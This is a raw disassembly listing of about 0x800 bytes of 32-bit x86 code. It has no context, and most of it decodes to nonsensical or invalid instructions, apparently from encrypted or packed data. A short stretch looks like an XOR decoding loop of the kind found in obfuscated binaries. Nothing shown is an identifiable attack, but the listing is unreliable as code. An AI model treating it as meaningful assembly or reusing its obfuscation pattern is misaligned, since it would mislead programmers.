  407838:	fild   QWORD PTR [ebx+ecx*1+0x4a]
  40783c:	cdq    
  40783d:	or     DWORD PTR [esi],ecx
  40783f:	xchg   esi,eax
  407840:	mov    ebx,0x261d14d8
  407845:	cmp    ch,BYTE PTR [ecx+0x5fd625d1]
  40784b:	in     eax,0x5d
  40784d:	sar    DWORD PTR [edi-0x11d2620b],cl
  407853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407854:	pop    esp
  407855:	outs   dx,BYTE PTR ds:[esi]
  407856:	fild   QWORD PTR [edx-0x24]
  407859:	add    edx,DWORD PTR [edi+0x2d]
  40785c:	int    0x71
  40785e:	lds    edx,FWORD PTR [ebp+0x78]
  407861:	and    al,0x74
  407863:	fstp   QWORD PTR [edx-0x1904b55f]
  407869:	pop    eax
  40786a:	popa   
  40786b:	js     0x407873
  40786d:	fs pop esp
  40786f:	jge    0x407819
  407871:	addr16 or edx,ecx
  407874:	xor    esi,DWORD PTR [eax]
  407876:	imul   ecx,DWORD PTR [eax+esi*2],0x3b
  40787a:	sbb    edx,DWORD PTR [ebp-0x6ea3c1b7]
  407880:	fiadd  WORD PTR [edx]
  407882:	jmp    0x4078c7
  407884:	mov    eax,0x2144f015
  407889:	rcl    BYTE PTR [ebp+eiz*8+0x899baf3],0x98
  407891:	and    eax,0x81fd708c
  407896:	pop    edi
  407897:	mov    ecx,0xe9f79144
  40789c:	fcmovb st,st(0)
  40789e:	inc    eax
  40789f:	pop    edi
  4078a0:	jb     0x407827
  4078a2:	cmc    
  4078a3:	push   DWORD PTR [esi+eax*4+0x7524e1c0]
  4078aa:	je     0x40788f
  4078ac:	inc    esi
  4078ad:	fidivr DWORD PTR [ebp+0x47]
  4078b0:	push   edi
  4078b1:	ret    
  4078b2:	test   BYTE PTR [ebp+0x799bfde2],0xb8
  4078b9:	out    dx,al
  4078ba:	fwait
  4078bb:	je     0x4078e3
  4078bd:	(bad)  
  4078be:	pop    ds
  4078bf:	scas   al,BYTE PTR es:[edi]
  4078c0:	inc    eax
  4078c1:	call   0x5d34d248
  4078c6:	fsubr  DWORD PTR [esi+0x560be23f]
  4078cc:	sub    edi,DWORD PTR [edi-0x51]
  4078cf:	inc    BYTE PTR [ecx]
  4078d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078d2:	imul   edx,DWORD PTR [eax-0x23254742],0x50
  4078d9:	sbb    edi,DWORD PTR [esi-0x6e01ff61]
  4078df:	and    al,0xe8
  4078e1:	xchg   DWORD PTR [eax-0x8],ecx
  4078e4:	sub    BYTE PTR es:[edx+0x19d73804],0x6b
  4078ec:	adc    dl,BYTE PTR [ebp+edi*4-0x26]
  4078f0:	dec    ebp
  4078f1:	es sti 
  4078f3:	aaa    
  4078f4:	inc    ebp
  4078f5:	out    dx,eax
  4078f6:	or     DWORD PTR ds:0x8873a511,eax
  4078fc:	pop    ebp
  4078fd:	mov    BYTE PTR ss:[ebp+0x6b],dh
  407901:	(bad)  
  407902:	aad    0x65
  407904:	into   
  407905:	repnz inc esp
  407907:	or     bl,BYTE PTR [ebx+edx*2]
  40790a:	imul   edi,DWORD PTR [eax+0x57581553],0x971abce
  407914:	add    BYTE PTR [eax-0x2ac71ca9],0x22
  40791b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40791c:	loop   0x407940
  40791e:	mov    edx,eax
  407920:	scas   eax,DWORD PTR es:[edi]
  407921:	push   cs
  407922:	jae    0x407988
  407924:	pop    eax
  407925:	push   ss
  407926:	xlat   BYTE PTR ds:[ebx]
  407927:	mov    BYTE PTR [eax+ecx*4-0x43],dl
  40792b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40792c:	sub    DWORD PTR ds:0xd1892f4c,0xffffffd7
  407933:	xchg   edx,eax
  407934:	push   esi
  407935:	or     BYTE PTR [ebx],cl
  407937:	out    0xfe,eax
  407939:	or     DWORD PTR [ebp+0x6fa454db],ecx
  40793f:	dec    eax
  407940:	sahf   
  407941:	clc    
  407942:	sub    esi,DWORD PTR [esi+0x1b09520b]
  407948:	bound  esi,QWORD PTR [eax+0x6]
  40794b:	inc    ebp
  40794c:	pop    eax
  40794d:	push   ebx
  40794e:	inc    esi
  40794f:	imul   esi,DWORD PTR [edi+0x5f],0x9ae6187
  407956:	cld    
  407957:	jg     0x4078ed
  407959:	test   eax,0xf73e85ab
  40795e:	ret    
  40795f:	mov    ebp,0x27c86350
  407964:	jp     0x40797e
  407966:	ret    0x4223
  407969:	cdq    
  40796a:	sar    BYTE PTR [esp+ecx*8+0x63],cl
  40796e:	dec    ecx
  40796f:	(bad)  
  407971:	cmp    al,0x1
  407973:	jno    0x4079d7
  407975:	push   cs
  407976:	sub    esp,DWORD PTR [ebp-0xe]
  407979:	aad    0xd8
  40797b:	scas   al,BYTE PTR es:[edi]
  40797c:	popa   
  40797d:	or     DWORD PTR [eax],edi
  40797f:	push   ecx
  407980:	leavew 
  407982:	fs push 0x11242b0
  407988:	test   BYTE PTR [edi],ch
  40798a:	sub    al,0x3d
  40798c:	sub    DWORD PTR [ecx+0x78],ebx
  40798f:	outs   dx,BYTE PTR ds:[esi]
  407990:	and    DWORD PTR [edi-0xaddaced],edi
  407996:	shr    edi,1
  407998:	daa    
  407999:	scas   al,BYTE PTR es:[edi]
  40799a:	gs push esp
  40799c:	neg    DWORD PTR [esi+ebx*1]
  40799f:	lods   al,BYTE PTR ds:[esi]
  4079a0:	fld    QWORD PTR [edx+ebp*4+0x2f]
  4079a4:	xchg   ebp,eax
  4079a5:	sbb    ebx,DWORD PTR [edx+0x2924c254]
  4079ab:	jge    0x407a27
  4079ad:	cmc    
  4079ae:	pop    esi
  4079af:	jmp    0x15b6:0xded5b8c
  4079b6:	pop    ebp
  4079b7:	push   0xd4692725
  4079bc:	xor    cl,al
  4079be:	xchg   edx,eax
  4079bf:	inc    esi
  4079c0:	(bad)  [eax-0x351b6021]
  4079c6:	repnz or al,dl
  4079c9:	adc    al,0x3
  4079cb:	cwde   
  4079cc:	push   esi
  4079cd:	js     0x40796f
  4079cf:	dec    edx
  4079d0:	arpl   bx,bx
  4079d2:	arpl   WORD PTR [ebx+0x45526055],cx
  4079d8:	pop    ebx
  4079d9:	dec    esi
  4079da:	sub    al,0x90
  4079dc:	jb     0x40796a
  4079de:	cmp    al,0x38
  4079e0:	test   DWORD PTR gs:[ebp+0x70],esp
  4079e4:	inc    eax
  4079e5:	aaa    
  4079e6:	or     BYTE PTR [edx],ah
  4079e8:	sub    eax,0xc589e25
  4079ed:	push   ebp
  4079ee:	or     bl,BYTE PTR [ebx+0x6792e31b]
  4079f4:	mov    esi,0x2ac1f6be
  4079f9:	loopne 0x407993
  4079fb:	es pop es
  4079fd:	xor    al,0xe3
  4079ff:	loope  0x4079ac
  407a01:	aaa    
  407a02:	mov    edi,0xc0d04b39
  407a07:	stos   DWORD PTR es:[edi],eax
  407a08:	mov    ecx,0x2bbc98bc
  407a0d:	mov    cl,0xb4
  407a0f:	xor    dl,BYTE PTR [ebp-0x5d]
  407a12:	sbb    eax,0x4a872531
  407a17:	mov    esp,0x692a50f3
  407a1c:	test   eax,0xbd6f0cfb
  407a21:	loope  0x4079ed
  407a23:	sbb    DWORD PTR [ecx],ebx
  407a25:	mov    WORD PTR [eax-0x2ebec4ba],ds
  407a2b:	inc    edi
  407a2c:	imul   eax,DWORD PTR [edx-0x6f],0xe84b7df5
  407a33:	cmp    esi,DWORD PTR [ecx-0x5a04ab92]
  407a39:	(bad)
  407a3c:	mov    ecx,0x6a49d041
  407a41:	cmp    dl,BYTE PTR [edx+0x53d90717]
  407a47:	add    dl,ch
  407a49:	lods   al,BYTE PTR ds:[esi]
  407a4a:	icebp  
  407a4b:	ds enter 0xaddf,0x3d
  407a50:	xchg   esp,eax
  407a51:	dec    edi
  407a52:	inc    esp
  407a53:	sbb    cl,BYTE PTR [esi+ebx*8+0x71]
  407a57:	inc    ebp
  407a58:	ss or  eax,0x83ecf85b
  407a5e:	das    
  407a5f:	or     eax,0xa92e1ec0
  407a64:	xchg   al,ah
  407a66:	jle    0x407a8c
  407a68:	jb     0x407ab0
  407a6a:	loope  0x4079f6
  407a6c:	push   edx
  407a6d:	or     eax,0x3af6233b
  407a72:	xchg   esp,eax
  407a73:	push   esp
  407a74:	sbb    eax,0x48867cf9
  407a79:	push   eax
  407a7a:	ins    BYTE PTR es:[edi],dx
  407a7b:	ret    0xb54a
  407a7e:	sti    
  407a7f:	scas   eax,DWORD PTR es:[edi]
  407a80:	dec    ebx
  407a81:	js     0x407a45
  407a83:	imul   ecx,DWORD PTR [edi+edi*2],0xffffffc7
  407a87:	unpcklps xmm3,XMMWORD PTR [edx+0x5f]
  407a8b:	pop    ecx
  407a8c:	enter  0x366,0xc7
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	rol    DWORD PTR [ecx-0x9],cl
  407ac3:	dec    esp
  407ac4:	pushf  
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407aed
  407acd:	dec    ecx
  407ace:	jmp    0x3ac0:0xf75c3ea7
  407ad5:	pop    ecx
  407ad6:	mov    DWORD PTR [edi-0x451c80d8],0xe2702ba7
  407ae0:	adc    DWORD PTR [esi-0x53f5fb6a],ecx
  407ae6:	and    BYTE PTR ds:0x3af3347e,al
  407aec:	add    DWORD PTR [eax],ebx
  407aee:	mov    eax,0x7f8bd4c1
  407af3:	jb     0x407b68
  407af5:	push   ecx
  407af6:	test   DWORD PTR [edi+0x4],edx
  407af9:	mov    DWORD PTR [edx-0x4d],0x1ea4a3df
  407b00:	lea    eax,[ebx+0x7b]
  407b03:	addps  xmm0,XMMWORD PTR [ebx+0x4e23079f]
  407b0a:	cmp    BYTE PTR [ebx-0x42627642],0xb1
  407b11:	mov    cl,BYTE PTR [edi+0x4d]
  407b14:	sub    eax,0x9508744a
  407b19:	mov    ebx,0x2be2da67
  407b1e:	inc    edi
  407b1f:	cmc    
  407b20:	jnp    0x407b8a
  407b22:	jns    0x407b8d
  407b24:	loop   0x407b27
  407b26:	lock and al,0x3
  407b29:	shl    DWORD PTR [esi-0x160a3ce2],1
  407b2f:	ret    0x74c9
  407b32:	jg     0x407afb
  407b34:	ds dec eax
  407b36:	add    dh,ch
  407b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b39:	and    ebx,DWORD PTR [edi]
  407b3b:	or     al,0x51
  407b3d:	loopne 0x407b66
  407b3f:	add    ebx,DWORD PTR [esi-0x50]
  407b42:	adc    bl,BYTE PTR [edi+edx*1-0x72325f89]
  407b49:	push   es
  407b4a:	test   eax,0xfa8a6760
  407b4f:	pop    eax
  407b50:	jnp    0x407b92
  407b52:	retf   
  407b53:	add    dl,BYTE PTR [edi+ecx*2+0x23]
  407b57:	popa   
  407b58:	and    ch,BYTE PTR [esi-0x4e61fdc0]
  407b5e:	in     eax,0x1e
  407b60:	into   
  407b61:	jecxz  0x407afa
  407b63:	out    dx,al
  407b64:	retf   
  407b65:	jge    0x407b07
  407b67:	mov    al,0xec
  407b69:	scas   eax,DWORD PTR es:[edi]
  407b6a:	adc    ebx,edi
  407b6c:	pop    ebp
  407b6d:	jecxz  0x407ba5
  407b6f:	scas   al,BYTE PTR es:[edi]
  407b70:	ins    BYTE PTR es:[edi],dx
  407b71:	call   0xfc5df882
  407b76:	test   BYTE PTR [eax-0x26a1842e],bh
  407b7c:	inc    edx
  407b7d:	xor    al,0x19
  407b7f:	int    0x3c
  407b81:	call   DWORD PTR [edi+0xb1a8317]
  407b87:	mov    ebx,0x649ac116
  407b8c:	imul   esi,esp,0xffffffc4
  407b8f:	jns    0x407beb
  407b91:	mov    bh,0x6c
  407b93:	ins    DWORD PTR es:[edi],dx
  407b94:	retf   0xa7b1
  407b97:	outs   dx,DWORD PTR ds:[esi]
  407b98:	mov    esi,0x87089b03
  407b9d:	jbe    0x407b1f
  407b9f:	rcr    BYTE PTR [eax-0x5e],cl
  407ba2:	push   esi
  407ba3:	push   edx
  407ba4:	shr    DWORD PTR [edx+esi*8-0x68],0xf4
  407ba9:	lock das 
  407bab:	cmp    BYTE PTR [edx+eiz*2],al
  407bae:	mov    ch,0xa9
  407bb0:	sub    eax,0xe5b7e49a
  407bb5:	or     ch,BYTE PTR [edi]
  407bb7:	mov    edx,0xc0f33a8e
  407bbc:	xor    DWORD PTR [edi-0xc],ebp
  407bbf:	neg    DWORD PTR [ebx]
  407bc1:	or     DWORD PTR [ebx+0x3e],esp
  407bc4:	mov    al,ds:0x92aed4d9
  407bc9:	pop    esp
  407bca:	jp     0x407c1b
  407bcc:	xor    DWORD PTR [eax+0xcd4bcb7],edx
  407bd2:	jle    0x407c37
  407bd4:	imul   esi,DWORD PTR [esi],0x1b2f4785
  407bda:	mov    eax,0x12074ad2
  407bdf:	es repnz xor al,0xca
  407be3:	inc    esi
  407be4:	mov    BYTE PTR [ebx-0x19afa11f],dh
  407bea:	popf   
  407beb:	imul   ebx,DWORD PTR [edx+0x1fb686a8],0xb3b89a1d
  407bf5:	jl     0x407c4e
  407bf7:	in     eax,0x34
  407bf9:	nop
  407bfa:	ret    0x30c3
  407bfd:	jp     0x407bb1
  407bff:	out    dx,eax
  407c00:	iret   
  407c01:	aas    
  407c02:	cmp    eax,0x3d8af8e4
  407c07:	mov    esp,0xc02ab844
  407c0c:	xchg   DWORD PTR [ebx],ecx
  407c0e:	bound  ebx,QWORD PTR [ecx-0x4d]
  407c11:	call   0x82e0bba3
  407c16:	add    ebx,esi
  407c18:	icebp  
  407c19:	mov    dh,0x18
  407c1b:	outs   dx,DWORD PTR ds:[esi]
  407c1c:	out    dx,eax
  407c1d:	loope  0x407bb9
  407c1f:	or     esp,DWORD PTR [ebp+0x5dbabb92]
  407c25:	xchg   esp,eax
  407c26:	add    cl,BYTE PTR [edx]
  407c28:	push   ebp
  407c29:	pop    ecx
  407c2a:	data16 shl BYTE PTR [ebx],cl
  407c2d:	pop    eax
  407c2e:	mov    dh,cl
  407c30:	and    ebx,DWORD PTR [ebx+ebx*8]
  407c33:	ret    
  407c34:	dec    ebx
  407c35:	adc    DWORD PTR [esi-0x7d],0x37
  407c39:	aaa    
  407c3a:	call   DWORD PTR [edi]
  407c3c:	pop    edi
  407c3d:	cmp    dh,BYTE PTR [ecx-0x5f]
  407c40:	stos   DWORD PTR es:[edi],eax
  407c41:	mov    esp,0xc475f477
  407c46:	xchg   esi,eax
  407c47:	int    0x6e
  407c49:	adc    esp,eax
  407c4b:	test   eax,0xfe4e1e7d
  407c50:	sub    al,0x4d
  407c52:	sar    DWORD PTR [ebp-0x252a2686],1
  407c58:	mov    WORD PTR [ebx+esi*2],es
  407c5b:	push   esi
  407c5c:	repnz popa 
  407c5e:	cmp    eax,DWORD PTR [ebx-0x4b50d684]
  407c64:	jecxz  0x407c97
  407c66:	mov    ds:0xa29acbf3,al
  407c6b:	es das 
  407c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c6e:	rol    DWORD PTR [esi+0x5457b506],1
  407c74:	pop    ebp
  407c75:	inc    ebp
  407c76:	push   0xdea5c0ec
  407c7b:	ds push ss
  407c7d:	test   BYTE PTR es:[ebx-0x2c20fa42],ah
  407c84:	out    0xea,eax
  407c86:	ss call 0x36e:0x7c609286
  407c8e:	cli    
  407c8f:	dec    edi
  407c90:	jbe    0x407c85
  407c92:	in     al,0x81
  407c94:	lods   al,BYTE PTR ds:[esi]
  407c95:	retf   0x44e8
  407c98:	sbb    ebp,edx
  407c9a:	pushf  
  407c9b:	jecxz  0x407c5e
  407c9d:	(bad)  
  407c9f:	in     eax,dx
  407ca0:	push   cs
  407ca1:	sub    eax,0x31934646
  407ca6:	sub    BYTE PTR [ecx+0x4a32ecf7],ah
  407cac:	ret    0xca6
  407caf:	mov    ds:0x29bd1641,al
  407cb4:	idiv   DWORD PTR [eax-0x74]
  407cb7:	inc    esi
  407cb8:	pop    edx
  407cb9:	mov    bl,0x9f
  407cbb:	jae    0x407cbf
  407cbd:	push   eax
  407cbe:	(bad)  
  407cbf:	jge    0x407cd6
  407cc1:	in     al,dx
  407cc2:	add    dh,BYTE PTR [eax+ebx*1]
  407cc5:	retf   
  407cc6:	ror    ebp,cl
  407cc8:	ror    ch,0x7f
  407ccb:	gs (bad) 
  407ccd:	or     DWORD PTR [ecx],esi
  407ccf:	jb     0x407cbd
  407cd1:	retf   
  407cd2:	sub    DWORD PTR [eax-0x4d4caf9e],eax
  407cd8:	xlat   BYTE PTR ds:[ebx]
  407cd9:	ja     0x407ca5
  407cdb:	push   ebp
  407cdc:	cdq    
  407cdd:	inc    ecx
  407cde:	sbb    dl,BYTE PTR [ebx+ecx*2+0x770b7e10]
  407ce5:	xor    DWORD PTR [ebx-0x12],esp
  407ce8:	mov    esp,0x52f7a392
  407ced:	retf   
  407cee:	retf   0x433
  407cf1:	in     al,dx
  407cf2:	mov    al,0x7a
  407cf4:	xor    dl,BYTE PTR [edx-0x2d]
  407cf7:	sti    
  407cf8:	stc    
  407cf9:	xor    eax,0x1a1dc4c8
  407cfe:	fiadd  DWORD PTR [ebp+0x5]
  407d01:	mov    es,WORD PTR ds:0x3a2ba0e6
  407d07:	add    DWORD PTR [ebx-0x7d30bd6a],ebx
  407d0d:	fdiv   QWORD PTR [edi]
  407d0f:	fdivr  DWORD PTR [ebx+0x55]
  407d12:	ins    BYTE PTR es:[edi],dx
  407d13:	(bad)  
  407d14:	sub    eax,ecx
  407d16:	mov    ds:0x1b0dc264,eax
  407d1b:	cld    
  407d1c:	jmp    0xf9ca60e4
  407d21:	dec    ebx
  407d22:	loopne 0x407cea
  407d24:	push   ebx
  407d25:	jmp    0x407d9c
  407d27:	or     eax,0x1d2767d1
  407d2c:	cs es pop ebx
  407d2f:	mov    dl,0xfc
  407d31:	call   0x3e8:0x2c256edd
  407d38:	sbb    al,0xcd
  407d3a:	mov    ch,0xaa
  407d3c:	xchg   DWORD PTR [ecx],eax
  407d3e:	adc    cl,BYTE PTR [edi+0x0]
  407d41:	jnp    0x407da7
  407d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d44:	pushf  
  407d45:	xor    al,0x96
  407d47:	inc    eax
  407d48:	ss cmp ax,0xc52a
  407d4d:	xor    eax,DWORD PTR [edi+edx*1]
  407d50:	pop    ebp
  407d51:	jnp    0x407ceb
  407d53:	adc    edi,ecx
  407d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d56:	dec    ecx
  407d57:	pushf  
  407d58:	fcomp  DWORD PTR [ebp-0x7e4d1b30]
  407d5e:	fadd   DWORD PTR [edi+eiz*2-0x2e]
  407d62:	mov    ch,BYTE PTR [ebp+0x7a2dd68f]
  407d68:	adc    esi,DWORD PTR [edx+ebp*2+0x20bab78c]
  407d6f:	xor    eax,0xd28c6e81
  407d74:	cdq    
  407d75:	shl    BYTE PTR [edi+0x39],1
  407d78:	mov    eax,0x2e4adae6
  407d7d:	adc    DWORD PTR [edx+ebx*2],eax
  407d80:	sub    BYTE PTR [eax+0x3c0d14d7],ch
  407d86:	ja     0x407de9
  407d88:	xchg   esi,eax
  407d89:	popf   
  407d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d8b:	loope  0x407d22
  407d8d:	jl     0x407d69
  407d8f:	adc    dh,bl
  407d91:	repz out dx,al
  407d93:	push   ebp
  407d94:	cld    
  407d95:	int3   
  407d96:	jae    0x407de2
  407d98:	inc    edx
  407d99:	sub    al,dl
  407d9b:	and    BYTE PTR [eax+eiz*1],0xba
  407d9f:	dec    ecx
  407da0:	sbb    cl,BYTE PTR fs:[edi]
  407da3:	mov    WORD PTR [ebx-0xf5ad5],?
  407da9:	and    eax,0xac75bccd
  407dae:	imul   esi,esp,0xffffffab
  407db1:	add    ch,BYTE PTR [ebx+ecx*1-0x41]
  407db5:	or     ch,dh
  407db7:	lock cmp edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdiv   DWORD PTR [ebp+0x68]
  407ddb:	jge    0x407de6
  407ddd:	mov    al,bl
  407ddf:	js     0x407e59
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407dad
  407de6:	sbb    DWORD PTR [esi-0x746bac34],0x2817c1b7
  407df0:	pop    ecx
  407df1:	ret    
  407df2:	jnp    0x407e2b
  407df4:	sub    DWORD PTR [esi],eax
  407df6:	xchg   BYTE PTR [ecx+0x61],dl
  407df9:	push   cs
  407dfa:	std    
  407dfb:	jnp    0x407d87
  407dfd:	jmp    0x2d37a186
  407e02:	pop    ebx
  407e03:	div    DWORD PTR [ebx-0x12850cd6]
  407e09:	pinsrw mm4,eax,0xc8
  407e0d:	mov    ebx,0xa438cdf3
  407e12:	add    ch,BYTE PTR [edi-0x7b]
  407e15:	sub    ecx,esi
  407e17:	push   cs
  407e18:	or     ebx,ecx
  407e1a:	pop    ss
  407e1b:	push   ebx
  407e1c:	inc    ebx
  407e1d:	mov    cl,0xf1
  407e1f:	push   0xffffff84
  407e21:	mov    esp,0x9ad7c82d
  407e26:	cmc    
  407e27:	push   ebx
  407e28:	fnstenv [eax-0x57f4d978]
  407e2e:	adc    DWORD PTR [ebx+0x3],edi
  407e31:	push   edi
  407e32:	popa   
  407e33:	jo     0x407dcb
  407e35:	push   ebp
  407e36:	in     al,0xc4
  407e38:	add    cl,BYTE PTR [ebp+0x5cb3072b]
  407e3e:	std    
  407e3f:	loop   0x407e26
  407e41:	xor    ecx,esi
  407e43:	push   0xe26b9668
  407e48:	call   0x2e51:0xaf12d794
  407e4f:	xor    dh,BYTE PTR [ebx+0x189432e7]
  407e55:	pop    ebx
  407e56:	ud0    edi,DWORD PTR ds:0x8c41532b
  407e5d:	and    BYTE PTR [esi+0x6d],cl
  407e60:	mov    cl,0x9b
  407e62:	arpl   WORD PTR [edx-0xf],bx
  407e65:	fxch   st(1)
  407e67:	cmp    DWORD PTR [eax],edi
  407e69:	loop   0x407ee3
  407e6b:	div    DWORD PTR [esi-0x1f33240b]
  407e71:	sub    DWORD PTR [eax+ecx*8-0x4a3a9c0f],eax
  407e78:	jo     0x407e1d
  407e7a:	sbb    dh,dh
  407e7c:	sub    DWORD PTR [ecx+0x7f],0x63
  407e80:	fidiv  DWORD PTR ds:0xd45f5b7a
  407e86:	inc    ecx
  407e87:	and    ecx,0xd646f744
  407e8d:	push   edi
  407e8e:	ds pop ecx
  407e90:	or     edx,DWORD PTR [esi-0x37]
  407e93:	sbb    ah,BYTE PTR [esi-0x3d]
  407e96:	mov    esp,0x8e486eed
  407e9b:	cmp    al,0x9f
  407e9d:	or     al,0x15
  407e9f:	ins    DWORD PTR es:[edi],dx
  407ea0:	and    eax,eax
  407ea2:	shr    DWORD PTR [eax],1
  407ea4:	push   ebx
  407ea5:	pop    esp
  407ea6:	pop    eax
  407ea7:	cmp    esi,DWORD PTR [ebx-0x50]
  407eaa:	inc    DWORD PTR [edi]
  407eac:	mov    bh,0x9a
  407eae:	lahf   
  407eaf:	push   cs
  407eb0:	sub    cl,cl
  407eb2:	mov    esi,0xd06010f6
  407eb7:	ins    BYTE PTR es:[edi],dx
  407eb8:	aas    
  407eb9:	mov    ds:0x516c8214,al
  407ebe:	xchg   edi,eax
  407ebf:	fbld   TBYTE PTR [ebp-0x7d]
  407ec2:	adc    al,0xa2
  407ec4:	(bad)  
  407ec5:	pop    edi
  407ec6:	not    DWORD PTR [eax-0x2e7fca36]
  407ecc:	adc    DWORD PTR [esi+edx*8-0x7],ebp
  407ed0:	cwde   
  407ed1:	xor    al,0xb2
  407ed3:	pop    edi
  407ed4:	sub    eax,0xe533864d
  407ed9:	(bad)  
  407edb:	jmp    0x407ea2
  407edd:	gs mov esp,0xc45a3d58
  407ee3:	add    bl,cl
  407ee5:	fcom   DWORD PTR [edi]
  407ee7:	pop    esp
  407ee8:	test   al,0x33
  407eea:	ds cmp ebx,0xd24dbf0b
  407ef1:	add    dl,BYTE PTR [ecx+0x4aecef0f]
  407ef7:	sbb    DWORD PTR [edi+0x5eb942ff],0xbf4e9d6d
  407f01:	jg     0x407f00
  407f03:	cli    
  407f04:	pushf  
  407f05:	jmp    0x44bd:0x56f1e8fb
  407f0c:	mov    ds:0x2e906a6,al
  407f11:	adc    ecx,DWORD PTR [eax-0x73]
  407f14:	out    dx,eax
  407f15:	mov    ebx,DWORD PTR [ebx+edx*8+0x16]
  407f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f1a:	imul   edi,DWORD PTR [eax+0x6],0x30d856b9
  407f21:	sbb    al,0x96
  407f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f24:	push   es
  407f25:	mov    cl,BYTE PTR [ebx]
  407f27:	stos   DWORD PTR es:[edi],eax
  407f28:	hlt    
  407f29:	bound  ebp,QWORD PTR [ebp-0x60]
  407f2c:	add    DWORD PTR [edi-0x4bb983f],0x10d04d22
  407f36:	je     0x407f5c
  407f38:	pop    eax
  407f39:	cmp    bl,BYTE PTR [ecx-0x675f9c2f]
  407f3f:	pop    eax
  407f40:	popf   
  407f41:	sub    al,0x90
  407f43:	daa    
  407f44:	xor    BYTE PTR ds:0xa3e88135,bl
  407f4a:	popf   
  407f4b:	push   ecx
  407f4c:	inc    ebp
  407f4d:	arpl   WORD PTR [edi+0x750e3897],dx
  407f53:	dec    edi
  407f54:	lods   eax,DWORD PTR ds:[esi]
  407f55:	(bad)  
  407f56:	jns    0x407fba
  407f58:	xchg   ebx,eax
  407f59:	cs sti 
  407f5b:	dec    eax
  407f5c:	fisub  WORD PTR [edi+0x64]
  407f5f:	jmp    0x6dd3:0x7e1d3b1a
  407f66:	pushf  
  407f67:	sbb    DWORD PTR [ebx+0x2a],0x43f70f1b
  407f6e:	or     dl,BYTE PTR [esp+edx*8-0x6185f0d7]
  407f75:	cmp    dl,bl
  407f77:	sbb    ebp,eax
  407f79:	cmp    al,0xa6
  407f7b:	jg     0x407f88
  407f7d:	adc    al,0xd5
  407f7f:	ret    
  407f80:	xor    eax,0xdaf7b685
  407f85:	pop    esi
  407f86:	mov    ebp,0x44fa8aca
  407f8b:	and    eax,0x3121d849
  407f90:	xchg   edi,eax
  407f91:	mov    ecx,0x7c6145af
  407f96:	in     eax,0xdf
  407f98:	sbb    DWORD PTR [esp+edi*4+0x5a79a892],edx
  407f9f:	sub    bl,BYTE PTR [edi+0x670caa47]
  407fa5:	cli    
  407fa6:	ss xchg esi,eax
  407fa8:	test   eax,0x18fabb40
  407fad:	cmc    
  407fae:	mov    esp,0xb8940a3d
  407fb3:	addr16 jg 0x407f76
  407fb6:	sub    bh,dh
  407fb8:	out    dx,al
  407fb9:	icebp  
  407fba:	mov    WORD PTR [ebx+0x66],?
  407fbd:	cmp    dl,BYTE PTR [edx-0x4b]
  407fc0:	mov    esp,0x1e9c6a48
  407fc5:	mov    al,ds:0x7932ac68
  407fca:	sahf   
  407fcb:	fcmovne st,st(0)
  407fcd:	push   es
  407fce:	imul   ebp,eax,0xa14deced
  407fd4:	(bad)  [ecx]
  407fd6:	xor    eax,0x5f39a65e
  407fdb:	sbb    eax,0xda9b269c
  407fe1:	pop    edi
  407fe2:	inc    esp
  407fe3:	inc    edi
  407fe4:	popa   
  407fe5:	out    0xe5,al
  407fe7:	dec    edi
  407fe8:	adc    ebx,ebp
  407fea:	jge    0x408040
  407fec:	retf   0xa943
  407fef:	pop    ebx
  407ff0:	sahf   
  407ff1:	rol    BYTE PTR [eax],1
  407ff3:	call   0x1a051e82
  407ff8:	push   esp
  407ff9:	mov    WORD PTR [edi+0x7a],gs
  407ffc:	inc    edi
  407ffd:	(bad)  
  407ffe:	in     eax,0xbc
  408000:	mul    DWORD PTR [esi-0x377f1542]
  408006:	jbe    0x407fa6
  408008:	pushf  
  408009:	add    eax,0xe4aca743
  40800e:	xchg   edx,eax
  40800f:	xchg   ebp,eax
  408010:	cli    
  408011:	xor    al,0x7f
  408013:	cdq    
  408014:	jb     0x40807b
  408016:	daa    
  408017:	mov    ds:0x402e54a8,al
  40801c:	dec    edi
  40801d:	loop   0x407fb8
  40801f:	rol    edx,1
  408021:	mov    ss,edx
  408023:	popf   
  408024:	pop    ds
  408025:	ja     0x407fea
  408027:	push   esi
  408028:	pusha  
  408029:	(bad)  
  40802a:	push   ebx
  40802b:	cmp    al,0xfe
  40802d:	popa   
  40802e:	push   esp
  40802f:	mov    es,WORD PTR [ecx-0x203f44b0]
  408035:	fsub   DWORD PTR ds:0x83f6f7f8
  40803b:	push   0xe721e2e2
  408040:	lods   al,BYTE PTR ds:[esi]
  408041:	mov    edi,ebx
  408043:	jne    0x40807c
  408045:	not    DWORD PTR [edx-0x68]
